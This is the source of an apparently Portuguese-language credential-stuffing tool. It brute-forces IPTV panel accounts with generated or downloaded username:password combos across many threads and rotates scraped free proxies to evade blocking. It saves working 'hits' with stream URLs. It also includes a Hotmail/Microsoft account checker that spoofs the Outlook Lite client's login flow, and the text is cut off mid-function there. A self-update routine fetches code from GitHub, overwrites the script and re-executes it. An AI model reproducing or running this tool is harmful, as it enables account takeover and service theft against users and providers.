#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import json
import time
import queue
import threading
import datetime
import subprocess
import random
import string
import platform
import uuid
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta

def install_package(package):
    subprocess.run([sys.executable, "-m", "pip", "install", package, "--quiet"], capture_output=True)

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    install_package("requests")
    import requests

try:
    import socks
except ImportError:
    install_package("PySocks")
    import socks

try:
    import colorama
    colorama.init()
except ImportError:
    install_package("colorama")
    import colorama
    colorama.init()

BASE_DIR = Path(__file__).parent
COMBO_DIR = BASE_DIR / "combos"
HITS_DIR = BASE_DIR / "hits"
PROXY_DIR = BASE_DIR / "proxys"
HOTMAIL_DIR = BASE_DIR / "hotmail"
HOTMAIL_COMBO_DIR = HOTMAIL_DIR / "combos"
HOTMAIL_HITS_DIR = HOTMAIL_DIR / "hits"

for d in [COMBO_DIR, HITS_DIR, PROXY_DIR, HOTMAIL_DIR, HOTMAIL_COMBO_DIR, HOTMAIL_HITS_DIR]:
    d.mkdir(exist_ok=True)

PROXY_FILE = PROXY_DIR / "proxys.txt"

GITHUB_RAW_URL = "https://github.com/zvzin7/IPTV-TOLLS"

VERSION = "1.0"

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

def log(msg, color=Colors.CYAN):
    print(f"{color}{msg}{Colors.RESET}")

def print_with_color(text, color):
    colors_map = {
        "red": Colors.RED,
        "green": Colors.GREEN,
        "yellow": Colors.YELLOW,
        "cyan": Colors.CYAN,
    }
    print(f"{colors_map.get(color, Colors.CYAN)}{text}{Colors.RESET}")

def clear_console():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

def sanitize_filename(name):
    return re.sub(r'[^a-zA-Z0-9]', '_', name)

def normalize_host(host_input):
    host = host_input.strip()
    if not host.startswith(('http://', 'https://')):
        host = 'http://' + host
    host = re.sub(r'/(c|stalker_portal|panel|portal).*$', '', host)
    return host.rstrip('/')

def get_combo_files():
    return sorted([f for f in COMBO_DIR.iterdir() if f.suffix == '.txt'])

def read_combos(file_path):
    combos = []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                user, pwd = line.split(':', 1)
                combos.append((user.strip(), pwd.strip()))
    except:
        pass
    return combos

def test_proxy_with_reason(proxy, test_url="http://httpbin.org/ip", timeout=5):
    proxy_lower = proxy.lower()
    if proxy_lower.startswith("socks5://"):
        proxy_type = "socks5"
        proxy_clean = proxy[9:]
    elif proxy_lower.startswith("socks4://"):
        proxy_type = "socks4"
        proxy_clean = proxy[9:]
    elif proxy_lower.startswith("http://"):
        proxy_type = "http"
        proxy_clean = proxy[7:]
    elif proxy_lower.startswith("https://"):
        proxy_type = "https"
        proxy_clean = proxy[8:]
    else:
        proxy_type = "http"
        proxy_clean = proxy

    parts = proxy_clean.split(':')
    if len(parts) < 2:
        return False, "Formato inválido (IP:porta obrigatório)", None

    if len(parts) == 2:
        host, port = parts[0], int(parts[1])
        username = password = None
    elif len(parts) == 3:
        if '.' in parts[2] or ':' not in parts[2]:
            host, port, extra = parts[0], int(parts[1]), parts[2]
            username = password = None
        else:
            username, password, host = parts[0], parts[1], parts[2]
            port = int(parts[3]) if len(parts) > 3 else None
    elif len(parts) >= 4:
        username, password, host, port = parts[0], parts[1], parts[2], int(parts[3])
    else:
        return False, "Formato inválido", None

    if not host or not port:
        return False, "Host ou porta ausente", None

    start = time.time()
    try:
        if proxy_type in ("http", "https"):
            proxy_url = f"{proxy_type}://{host}:{port}"
            if username and password:
                proxy_url = f"{proxy_type}://{username}:{password}@{host}:{port}"
            proxies = {"http": proxy_url, "https": proxy_url}
            r = requests.get(test_url, proxies=proxies, timeout=timeout, verify=False)
            if r.status_code == 200:
                elapsed = (time.time() - start) * 1000
                return True, f"LIVE ({elapsed:.0f}ms)", elapsed
            else:
                return False, f"HTTP {r.status_code}", None
        else:
            sock = socks.socksocket()
            if proxy_type == "socks5":
                sock.set_proxy(socks.SOCKS5, host, port, username=username, password=password)
            else:
                sock.set_proxy(socks.SOCKS4, host, port, username=username)
            sock.settimeout(timeout)
            sock.connect(("httpbin.org", 80))
            sock.send(b"GET /ip HTTP/1.1\r\nHost: httpbin.org\r\n\r\n")
            sock.recv(1024)
            sock.close()
            elapsed = (time.time() - start) * 1000
            return True, f"LIVE ({elapsed:.0f}ms)", elapsed
    except Exception as e:
        return False, str(e)[:30], None

def fetch_proxies_online(proxy_type_choice, target_count=300, max_ms=50, max_workers=200):
    log(f"\n[+] Buscando proxies online (tipo: {'HTTP/HTTPS' if proxy_type_choice == 1 else 'SOCKS4/5'})...", Colors.CYAN)
    sources = []
    if proxy_type_choice == 1:
        sources = [
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http.txt",
    "https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/main/Stable/http.txt",
    "https://raw.githubusercontent.com/ClearProxy/checked-proxy-list/main/http/stable.txt"
]
    else:
        sources = [
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5.txt",
    "https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/main/Stable/socks5.txt",
    "https://raw.githubusercontent.com/ClearProxy/checked-proxy-list/main/socks5/stable.txt"
]

    raw_proxies = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=15)
            for line in r.text.splitlines():
                line = line.strip()
                if line and ':' in line and not line.startswith('#'):
                    raw_proxies.add(line)
        except:
            pass

    if not raw_proxies:
        log("[!] Nenhum proxy obtido. Usando locais...", Colors.YELLOW)
        if PROXY_FILE.exists():
            with open(PROXY_FILE, 'r') as f:
                raw_proxies = set(line.strip() for line in f if line.strip())
    if not raw_proxies:
        log("[!] Nenhum proxy disponível.", Colors.RED)
        return []

    log(f"[+] Obtidos {len(raw_proxies)} proxies. Testando (limite: {max_ms}ms, alvo: {target_count})...", Colors.CYAN)

    with open(PROXY_FILE, 'w') as f:
        f.write("")

    live_proxies = []
    lock = threading.Lock()
    stop_event = threading.Event()
    tested = 0
    total = len(raw_proxies)

    def test_and_save(proxy):
        nonlocal tested
        if stop_event.is_set():
            return
        is_live, motivo, ms = test_proxy_with_reason(proxy, timeout=5)
        with lock:
            tested += 1
            if is_live and ms <= max_ms:
                live_proxies.append(proxy)
                with open(PROXY_FILE, 'a', encoding='utf-8') as f:
                    f.write(proxy + "\n")
                print(f"{Colors.GREEN}✓ LIVE{Colors.RESET} - {proxy} -> {motivo} (≈{ms:.0f}ms) [{tested}/{total}]")
                if len(live_proxies) >= target_count:
                    stop_event.set()
                    print(f"\n{Colors.GREEN}[+] Meta de {target_count} proxies atingida! Interrompendo...{Colors.RESET}")
            else:
                print(f"{Colors.RED}✗ DIE{Colors.RESET}  - {proxy} -> {motivo} [{tested}/{total}]")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(test_and_save, p) for p in raw_proxies]
        for f in futures:
            if stop_event.is_set():
                executor.shutdown(wait=False, cancel_futures=True)
                break
            f.result()

    log(f"\n[+] Finalizado! {len(live_proxies)} proxies aprovados salvos em {PROXY_FILE}", Colors.GREEN)
    if live_proxies:
        unique = list(dict.fromkeys(live_proxies))
        with open(PROXY_FILE, 'w', encoding='utf-8') as f:
            f.write("\n".join(unique))
        log(f"[+] Arquivo final limpo e ordenado: {len(unique)} proxies únicos.", Colors.GREEN)
    return live_proxies

def load_proxies_from_file():
    proxies = []
    if PROXY_FILE.exists():
        try:
            with open(PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        proxies.append(line)
        except:
            pass
    return proxies

def check_account_multi(host, username, password, proxy_str=None):
    if not host.startswith(('http://', 'https://')):
        host = 'http://' + host
    host = host.rstrip('/')
    endpoints = ["player_api.php", "panel_api.php"]
    proxies = None
    if proxy_str:
        proxies = {'http': proxy_str, 'https': proxy_str}
    data = None
    for api in endpoints:
        try:
            url = f"{host}/{api}?username={username}&password={password}"
            resp = requests.get(url, proxies=proxies, timeout=10, verify=False)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if "user_info" in data:
                        break
                except:
                    pass
        except:
            continue
    if not data:
        test_url = f"{host}/get.php?username={username}&password={password}"
        try:
            resp = requests.get(test_url, proxies=proxies, timeout=10, verify=False)
            if resp.status_code == 200 and ("#EXTM3U" in resp.text or "stream" in resp.text):
                info = {
                    "host": host, "user": username, "pass": password, "created": "N/A",
                    "expires": "N/A", "days_left": "", "channels": 0, "movies": 0, "series": 0,
                    "m3u_url": test_url
                }
                return True, info
        except:
            pass
        return False, None
    user_info = data.get("user_info", {})
    if user_info.get("status", "").lower() != "active":
        return False, None
    def count_streams(action):
        url = f"{host}/player_api.php?username={username}&password={password}&action={action}"
        try:
            r = requests.get(url, proxies=proxies, timeout=8, verify=False)
            if r.status_code == 200:
                lst = r.json()
                return len(lst) if isinstance(lst, list) else 0
        except:
            pass
        return 0
    channels = count_streams("get_live_streams")
    movies = count_streams("get_vod_streams")
    series = count_streams("get_series")
    created_ts = user_info.get("created_at")
    exp_ts = user_info.get("exp_date")
    try:
        created_ts = int(created_ts) if created_ts else None
    except:
        created_ts = None
    try:
        exp_ts = int(exp_ts) if exp_ts else None
    except:
        exp_ts = None
    created_str = datetime.fromtimestamp(created_ts).strftime("%d/%m/%Y") if created_ts else "N/A"
    expires_str = datetime.fromtimestamp(exp_ts).strftime("%d/%m/%Y") if exp_ts else "N/A"
    days_left = ""
    if exp_ts:
        days = (exp_ts - int(time.time())) // 86400
        days_left = f"({days} dias)" if days >= 0 else "(Expirada)"
    m3u_url = f"{host}/get.php?username={username}&password={password}&type=m3u_plus"
    info = {
        "host": host, "user": username, "pass": password,
        "created": created_str, "expires": expires_str, "days_left": days_left,
        "channels": channels, "movies": movies, "series": series, "m3u_url": m3u_url
    }
    return True, info

def save_hit(host, info):
    host_safe = sanitize_filename(host)
    hits_file = HITS_DIR / f"{host_safe}.txt"
    output = f"""
host: {info['host']}
User: {info['user']}
Senha: {info['pass']}
Válido: sim
Criado: {info['created']}
Expira: {info['expires']} {info['days_left']}
Canais: {info['channels']}
Filmes: {info['movies']}
Séries: {info['series']}
URL: {info['m3u_url']}
By: @Zvzin7
"""
    user_pass = f"{info['user']}:{info['pass']}"
    if hits_file.exists():
        with open(hits_file, 'r', encoding='utf-8') as f:
            if user_pass in f.read():
                return
    with open(hits_file, 'a', encoding='utf-8') as f:
        f.write(output)
    all_hits = HITS_DIR / "todos_hits.txt"
    with open(all_hits, 'a', encoding='utf-8') as f:
        f.write(output)

def run_iptv_check():
    raw_host = input("Host (ex: pvsrvs.xyz:80): ").strip()
    if not raw_host:
        log("[!] Host não informado.", Colors.RED)
        return
    host = normalize_host(raw_host)
    log(f"[+] Host normalizado: {host}", Colors.CYAN)
    use_proxy = input("Usar proxy? (1-Sim / 2-Não): ").strip()
    proxies = [None]
    if use_proxy == "1":
        if input("Buscar proxies novos? (1-Sim / 2-Não): ") == "1":
            ptype = input("Tipo:\n1 - HTTP/HTTPS\n2 - SOCKS4/5\n: ")
            if ptype not in ("1","2"):
                return
            target = int(input("Quantidade desejada: ") or 300)
            max_ms = int(input("Velocidade máxima (ms): ") or 50)
            fetch_proxies_online(int(ptype), target, max_ms)
        proxies = load_proxies_from_file()
        if not proxies:
            log("[!] Nenhum proxy. Execute a busca primeiro.", Colors.RED)
            return
        log(f"[+] {len(proxies)} proxies carregados.", Colors.CYAN)
    try:
        max_threads = min(int(input("Threads (max 250): ") or 80), 250)
    except:
        max_threads = 80
    combo_files = get_combo_files()
    if not combo_files:
        log("[!] Nenhum combo na pasta 'combos'.", Colors.RED)
        return
    print("\nCombos disponíveis:")
    for i, f in enumerate(combo_files, 1):
        print(f"  {i}. {f.name}")
    idx = int(input("Escolha: ")) - 1
    if idx < 0 or idx >= len(combo_files):
        log("[!] Opção inválida.", Colors.RED)
        return
    combos = read_combos(combo_files[idx])
    total = len(combos)
    if total == 0:
        log("[!] Combo vazio.", Colors.RED)
        return
    log(f"[+] Iniciando verificação de {total} combos com {max_threads} threads...", Colors.CYAN)
    work_queue = queue.Queue()
    for user, pwd in combos:
        work_queue.put((user, pwd))
    hits = 0
    lock = threading.Lock()
    proxy_list = proxies[:]
    proxy_idx = 0
    start_time = time.time()
    def worker():
        nonlocal proxy_idx, hits
        while True:
            try:
                user, pwd = work_queue.get_nowait()
            except queue.Empty:
                break
            with lock:
                proxy = proxy_list[proxy_idx % len(proxy_list)]
                proxy_idx += 1
            valid, info = check_account_multi(host, user, pwd, proxy)
            with lock:
                if valid:
                    hits += 1
                    save_hit(host, info)
                    output = f"host: {info['host']}\nUser: {info['user']}\nSenha: {info['pass']}\nVálido: sim\nURL: {info['m3u_url']}\nBy: @Zvzin7\n"
                    print(f"{Colors.GREEN}{output}{Colors.RESET}")
                else:
                    output = f"host: {host}\nUser: {user}\nSenha: {pwd}\nVálido: não\nBy: @Zvzin7\n"
                    print(f"{Colors.RED}{output}{Colors.RESET}")
                processed = total - work_queue.qsize()
                print(f"{Colors.YELLOW}Progresso: {processed}/{total} | Hits: {hits}{Colors.RESET}\n")
            work_queue.task_done()
    threads = []
    for _ in range(max_threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    elapsed = time.time() - start_time
    print(f"\n{Colors.GREEN}[+] VERIFICAÇÃO CONCLUÍDA!{Colors.RESET}")
    print(f"    Total de combos: {total}\n    Hits encontrados: {hits}\n    Tempo total: {elapsed:.2f} segundos")
    print(f"    Hits salvos em: {HITS_DIR / sanitize_filename(host)}.txt")

def generate_combos(num_users, num_passwords, num_lines, mode):
    combos = []
    for _ in range(num_lines):
        if mode == "1":
            user = ''.join(str(random.randint(0,9)) for _ in range(num_users))
            password = ''.join(str(random.randint(0,9)) for _ in range(num_passwords))
        elif mode == "2":
            user = ''.join(random.choice(string.ascii_letters) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_letters) for _ in range(num_passwords))
        elif mode == "3":
            user = ''.join(random.choice(string.ascii_uppercase) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_uppercase) for _ in range(num_passwords))
        elif mode == "4":
            user = ''.join(random.choice(string.ascii_lowercase) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_lowercase) for _ in range(num_passwords))
        elif mode == "5":
            user = ''.join(random.choice(string.ascii_letters+string.digits) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_letters+string.digits) for _ in range(num_passwords))
        elif mode == "6":
            user = ''.join(random.choice(string.ascii_uppercase+string.digits) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_uppercase+string.digits) for _ in range(num_passwords))
        elif mode == "7":
            user = ''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(num_passwords))
        elif mode == "8":
            user = ''.join(random.choice(string.digits+string.punctuation) for _ in range(num_users))
            password = ''.join(random.choice(string.digits+string.punctuation) for _ in range(num_passwords))
        elif mode == "9":
            user = ''.join(random.choice(string.ascii_letters+string.punctuation) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_letters+string.punctuation) for _ in range(num_passwords))
        elif mode == "10":
            user = ''.join(random.choice(string.ascii_uppercase+string.punctuation) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_uppercase+string.punctuation) for _ in range(num_passwords))
        elif mode == "11":
            user = ''.join(random.choice(string.ascii_lowercase+string.punctuation) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_lowercase+string.punctuation) for _ in range(num_passwords))
        elif mode == "12":
            user = ''.join(random.choice(string.ascii_letters+string.digits+string.punctuation) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_letters+string.digits+string.punctuation) for _ in range(num_passwords))
        elif mode == "13":
            user = ''.join(random.choice(string.ascii_uppercase+string.digits+string.punctuation) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_uppercase+string.digits+string.punctuation) for _ in range(num_passwords))
        elif mode == "14":
            user = ''.join(random.choice(string.ascii_lowercase+string.digits+string.punctuation) for _ in range(num_users))
            password = ''.join(random.choice(string.ascii_lowercase+string.digits+string.punctuation) for _ in range(num_passwords))
        else:
            return []
        combos.append(f"{user}:{password}")
    return combos

def save_combos_to_file(combos, filename):
    filepath = COMBO_DIR / filename
    with open(filepath, "w", encoding='utf-8') as f:
        f.write("\n".join(combos))
    print_with_color(f"[+] {len(combos)} combos salvos em {filepath}", "green")

def extract_links_from_file(file_path):
    keywords = ["username","password","m3u","user","pass","hls","mpegs","ts","stream","usuário","usuario","senha","mac"]
    links = []
    try:
        with open(file_path, "r", encoding='utf-8', errors='ignore') as f:
            content = f.read()
        found_links = re.findall(r'https?://\S+', content)
        filtered = [l for l in found_links if any(k in l.lower() for k in keywords)]
        return filtered
    except:
        return []

def save_links_to_file(links, filename):
    filepath = COMBO_DIR / filename
    with open(filepath, "w", encoding='utf-8') as f:
        f.write("\n".join(links))
    print_with_color(f"[+] Links salvos em {filepath}", "green")

def unify_files(folder_path, chosen_indices, output_filename):
    files = [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
    combined = []
    for idx in chosen_indices:
        if 1 <= idx <= len(files):
            path = os.path.join(folder_path, files[idx-1])
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                combined.extend(f.readlines())
    if combined:
        out = COMBO_DIR / output_filename
        with open(out, 'w', encoding='utf-8') as f:
            f.writelines(combined)
        print_with_color(f"[+] Unificado em {out}", "green")
    else:
        print_with_color("[!] Nenhum conteúdo unificado.", "red")

def combo_generator_menu():
    clear_console()
    print_with_color("╔══════════════════════════════════════╗", "cyan")
    print_with_color("║         GERADOR DE COMBOS            ║", "cyan")
    print_with_color("╚══════════════════════════════════════╝", "cyan")
    print_with_color("1. Somente números", "yellow")
    print_with_color("2. Somente letras", "yellow")
    print_with_color("3. Somente letras maiúsculas", "yellow")
    print_with_color("4. Somente letras minúsculas", "yellow")
    print_with_color("5. Números e letras", "yellow")
    print_with_color("6. Números e letras maiúsculas", "yellow")
    print_with_color("7. Números e letras minúsculas", "yellow")
    print_with_color("8. Números e símbolos", "yellow")
    print_with_color("9. Letras e símbolos", "yellow")
    print_with_color("10. Letras maiúsculas e símbolos", "yellow")
    print_with_color("11. Letras minúsculas e símbolos", "yellow")
    print_with_color("12. Números, letras e símbolos", "yellow")
    print_with_color("13. Números, letras maiúsculas e símbolos", "yellow")
    print_with_color("14. Números, letras minúsculas e símbolos", "yellow")
    opt = input("\nEscolha (1-14): ").strip()
    if opt not in [str(i) for i in range(1,15)]:
        print_with_color("Opção inválida!", "red")
        return
    try:
        num_users = int(input("Tamanho do usuário: "))
        num_pass = int(input("Tamanho da senha: "))
        num_lines = int(input("Número de linhas: "))
    except:
        print_with_color("Use números válidos.", "red")
        return
    combos = generate_combos(num_users, num_pass, num_lines, opt)
    if combos:
        nome = input("Nome do arquivo (sem extensão): ").strip() or "combo_gerado"
        save_combos_to_file(combos, nome + ".txt")

def extract_links_menu():
    clear_console()
    files = get_combo_files()
    if not files:
        print_with_color("[!] Nenhum arquivo na pasta 'combos'.", "red")
        return
    print("\nArquivos disponíveis:")
    for i, f in enumerate(files,1):
        print(f"{i}. {f.name}")
    ch = input("Escolha um número ou 'all': ").strip()
    if ch.lower() == 'all':
        all_links = []
        for f in files:
            all_links.extend(extract_links_from_file(f))
        if all_links:
            print("\n".join(all_links))
            nome = input("Nome para salvar: ").strip() or "links_extraidos"
            save_links_to_file(all_links, nome+".txt")
        else:
            print_with_color("Nenhum link encontrado.", "red")
    elif ch.isdigit() and 1 <= int(ch) <= len(files):
        f = files[int(ch)-1]
        links = extract_links_from_file(f)
        if links:
            print("\n".join(links))
            nome = input("Nome para salvar: ").strip() or f"{f.stem}_links"
            save_links_to_file(links, nome+".txt")
        else:
            print_with_color("Nenhum link encontrado.", "red")
    else:
        print_with_color("Opção inválida.", "red")

def unify_files_menu():
    clear_console()
    files = get_combo_files()
    if not files:
        print_with_color("[!] Nenhum arquivo.", "red")
        return
    print("\nArquivos disponíveis:")
    for i, f in enumerate(files,1):
        print(f"{i}. {f.name}")
    escolha = input("Números para unificar (ex: 1 3 5): ").strip()
    if not escolha:
        return
    indices = []
    for p in escolha.split():
        if p.isdigit():
            indices.append(int(p))
    if not indices:
        print_with_color("Nenhum número válido.", "red")
        return
    out_nome = input("Nome do arquivo unificado (sem extensão): ").strip() or "unificado"
    unify_files(COMBO_DIR, indices, out_nome+".txt")

def list_repo_files(folder_path):
    try:
        api_url = GITHUB_RAW_URL.replace("/main", "") + f"/contents/{folder_path}"
        api_url = api_url.replace("raw.githubusercontent.com", "api.github.com/repos")
        if "api.github.com" not in api_url:
            parts = GITHUB_RAW_URL.replace("https://raw.githubusercontent.com/", "").split("/")
            if len(parts) >= 2:
                api_url = f"https://api.github.com/repos/{parts[0]}/{parts[1]}/contents/{folder_path}"
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            files = response.json()
            return [f['name'] for f in files if f['name'].endswith('.txt')]
        return []
    except:
        return []

def download_file(repo_path, local_path):
    try:
        url = f"{GITHUB_RAW_URL}/{repo_path}"
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            with open(local_path, 'wb') as f:
                f.write(response.content)
            return True, "Download concluído!"
        return False, f"HTTP {response.status_code}"
    except Exception as e:
        return False, str(e)[:50]

def download_combos_from_repo():
    clear_console()
    print_with_color("╔══════════════════════════════════════╗", "cyan")
    print_with_color("║        DOWNLOAD DE COMBOS           ║", "cyan")
    print_with_color("╚══════════════════════════════════════╝", "cyan")
    print_with_color("\n[📁] Buscando combos disponíveis...", "yellow")
    files = list_repo_files("combos")
    if not files:
        print_with_color("[!] Nenhum combo encontrado no repositório", "red")
        input("\nPressione Enter para voltar...")
        return
    print_with_color("\nCombos disponíveis para download:", "green")
    for i, f in enumerate(files, 1):
        print(f"  {i}. {f}")
    print("  0. Voltar")
    try:
        choice = input("\nEscolha: ").strip()
        if choice == "0":
            return
        idx = int(choice) - 1
        if 0 <= idx < len(files):
            filename = files[idx]
            local_path = COMBO_DIR / filename
            print_with_color(f"\n[⬇️] Baixando {filename}...", "cyan")
            success, msg = download_file(f"combos/{filename}", local_path)
            if success:
                print_with_color(f"[✓] {msg}", "green")
                print_with_color(f"[📁] Salvo em: {local_path}", "yellow")
            else:
                print_with_color(f"[✗] Falha: {msg}", "red")
        else:
            print_with_color("[!] Opção inválida", "red")
    except:
        print_with_color("[!] Entrada inválida", "red")
    input("\nPressione Enter para continuar...")

def download_proxys_from_repo():
    clear_console()
    print_with_color("╔══════════════════════════════════════╗", "cyan")
    print_with_color("║        DOWNLOAD DE PROXYS           ║", "cyan")
    print_with_color("╚══════════════════════════════════════╝", "cyan")
    filename = "proxys.txt"
    local_path = PROXY_FILE
    print_with_color(f"\n[⬇️] Baixando {filename}...", "cyan")
    success, msg = download_file(f"proxys/{filename}", local_path)
    if success:
        print_with_color(f"[✓] {msg}", "green")
        print_with_color(f"[📁] Salvo em: {local_path}", "yellow")
        try:
            with open(local_path, 'r') as f:
                lines = [l for l in f if l.strip()]
                print_with_color(f"[📊] Total de proxies: {len(lines)}", "green")
        except:
            pass
    else:
        print_with_color(f"[✗] Falha: {msg}", "red")
        print_with_color("[💡] Verifique se o arquivo 'proxys/proxys.txt' existe no repositório", "yellow")
    input("\nPressione Enter para voltar...")

def check_for_updates():
    try:
        print_with_color("\n[🔄] Verificando atualizações...", "cyan")
        url = f"{GITHUB_RAW_URL}/bot.py"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            remote_content = response.text
            version_match = re.search(r'VERSION\s*=\s*["\']([^"\']+)["\']', remote_content)
            if version_match:
                remote_version = version_match.group(1)
                if remote_version != VERSION:
                    print_with_color(f"\n[⚠️] NOVA VERSÃO DISPONÍVEL!", "yellow")
                    print_with_color(f"    Atual: {VERSION} → Nova: {remote_version}", "yellow")
                    return True, remote_content
                else:
                    print_with_color(f"[✓] Você já está na versão mais recente ({VERSION})", "green")
                    return False, None
        print_with_color("[!] Falha ao verificar atualizações", "red")
        return False, None
    except Exception as e:
        print_with_color(f"[!] Erro: {str(e)[:40]}", "red")
        return False, None

def apply_update(remote_content):
    try:
        backup_file = BASE_DIR / f"bot.py.backup"
        with open(__file__, 'r', encoding='utf-8') as original:
            with open(backup_file, 'w', encoding='utf-8') as backup:
                backup.write(original.read())
        with open(__file__, 'w', encoding='utf-8') as f:
            f.write(remote_content)
        print_with_color(f"\n[✓] ATUALIZAÇÃO CONCLUÍDA!", "green")
        print_with_color(f"[📁] Backup: {backup_file}", "yellow")
        print_with_color("[🔄] Reiniciando...", "cyan")
        time.sleep(2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        print_with_color(f"[✗] Erro: {str(e)}", "red")

def create_combos_menu():
    while True:
        clear_console()
        print_with_color("╔══════════════════════════════════════╗", "cyan")
        print_with_color("║         GERENCIADOR DE COMBOS        ║", "cyan")
        print_with_color("╚══════════════════════════════════════╝", "cyan")
        print_with_color("1. Gerar novos combos", "yellow")
        print_with_color("2. Extrair links de combos", "yellow")
        print_with_color("3. Unificar arquivos de combos", "yellow")
        print_with_color("4. Baixar combos do repositório", "yellow")
        print_with_color("5. Baixar proxys do repositório", "yellow")
        print_with_color("6. Voltar ao menu principal", "yellow")
        opt = input("Escolha: ").strip()
        if opt == "1":
            combo_generator_menu()
            input("\nPressione Enter...")
        elif opt == "2":
            extract_links_menu()
            input("\nPressione Enter...")
        elif opt == "3":
            unify_files_menu()
            input("\nPressione Enter...")
        elif opt == "4":
            download_combos_from_repo()
        elif opt == "5":
            download_proxys_from_repo()
        elif opt == "6":
            break
        else:
            print_with_color("Opção inválida.", "red")
            input("Pressione Enter...")

def generate_guid():
    return str(uuid.uuid4())

def check_hotmail_account(user: str, password: str, keyword: str):
    session = requests.Session()
    session.verify = False
    UUID = generate_guid()
    cookies_jar = {}
    url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={user}"
    headers1 = {
        "X-OneAuth-AppName": "Outlook Lite", "X-Office-Version": "3.11.0-minApi24",
        "X-CorrelationId": UUID, "X-Office-Application": "145", "X-OneAuth-Version": "1.83.0",
        "X-Office-Platform": "Android", "X-Office-Platform-Version": "28",
        "Enlightened-Hrd-Client": "0", "X-OneAuth-AppId": "com.microsoft.outlooklite",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
        "Host": "odc.officeapps.live.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    try:
        r1 = session.get(url1, headers=headers1, timeout=30)
        src1 = r1.text
        if any(x in src1 for x in ["Neither","Both","Placeholder","OrgId"]) or "MSAccount" not in src1:
            return {"status":"FAILURE","reason":"Not valid MSAccount"}
    except:
        return {"status":"FAILURE","reason":"Connection error"}

    url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={user}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
    headers2 = {
        "Host": "login.microsoftonline.com", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "return-client-request-id": "false", "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
        "x-ms-sso-ignore-sso": "1", "correlation-id": UUID, "x-client-ver": "1.1.0+9e54a0d1",
        "x-client-os": "28", "x-client-sku": "MSAL.xplat.android", "x-client-src-sku": "MSAL.xplat.android",
        "X-Requested-With": "com.microsoft.outlooklite", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9"
    }
    try:
        r2_init = session.get(url2, headers=headers2, allow_redirects=False, timeout=30)
        if r2_init.status_code in [301,302,303,307,308]:
            redirect = r2_init.headers.get('Location','')
            cookies_jar.update(session.cookies.get_dict())
            headers2_live = headers2.copy()
            headers2_live["Host"] = "login.live.com"
            r2 = session.get(redirect, headers=headers2_live, timeout=30)
            src2 = r2.text
            addr2 = r2.url
        else:
            r2 = r2_init
            src2 = r2.text
            addr2 = r2.url
    except:
        return {"status":"FAILURE","reason":"Login page error"}

    cookies_jar.update(session.cookies.get_dict())
    url_post_match = re.search(r'urlPost["\']?\s*:\s*["\']([^"\']+)["\']', src2)
    if not url_post_match:
        return {"status":"FAILURE","reason":"No urlPost"}
    URL = url_post_match.group(1)
    ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', src2)
    if not ppft_match:
        ppft_match = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^"\\]+)', src2)
    if not ppft_match:
